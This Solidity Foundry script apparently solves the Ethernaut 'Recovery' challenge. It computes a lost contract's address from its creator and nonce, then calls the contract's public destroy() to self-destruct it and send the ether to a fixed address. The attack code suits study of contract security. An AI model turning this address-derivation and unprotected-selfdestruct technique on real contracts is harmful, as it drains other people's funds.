// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


import "./Recovery.sol";

contract RecoveryAttackScript is Script {

    function run() external{
        vm.startBroadcast();
        address payable lostcontract = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(0xd89bEAe5D371Bc79754623f7f789a395F3D83b3C), bytes1(0x01))))));

        Recovery recovery = Recovery(lostcontract);
        recovery.destroy(0xEAce4b71CA1A128e8B562561f46896D55B9B0246);

        vm.stopBroadcast();
    }
}


